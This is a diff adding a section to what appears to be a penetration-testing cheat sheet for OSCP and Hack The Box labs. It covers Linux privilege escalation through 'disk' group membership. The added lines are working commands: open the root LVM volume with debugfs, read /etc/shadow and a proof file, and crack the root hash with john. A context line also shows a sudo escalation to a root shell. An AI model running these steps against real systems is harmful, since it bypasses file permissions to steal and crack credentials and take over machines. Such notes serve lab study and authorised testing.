@@ -2723,7 +2723,20 @@ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
 sudo -l # (root) NOPASSWD: ALL
 sudo /bin/bash # Boom we are root
 ```
-
+## Disk group Linux PrivEsc, /dev/mapper/ubuntu--vg-ubuntu--lv 
+- i Have a situation, When i try the id command it show 6(disk) end of the line along with username
+- Referance Extplorer
+```powershell
+id # uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
+df -h # /dev/mapper/ubuntu--vg-ubuntu--lv
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+debugfs:  cat proof.txt
+#cat proof.txt # got root.txt
+debugfs:  cat /etc/shadow
+#cat /etc/shadow # got file
+quit # exit from the terminal
+john root_hash.txt --wordlist=/home/kali/HTB/OSCP/rockyou.txt  # Copy hash crack through john
+```
 ---
 # Post Exploitation
 
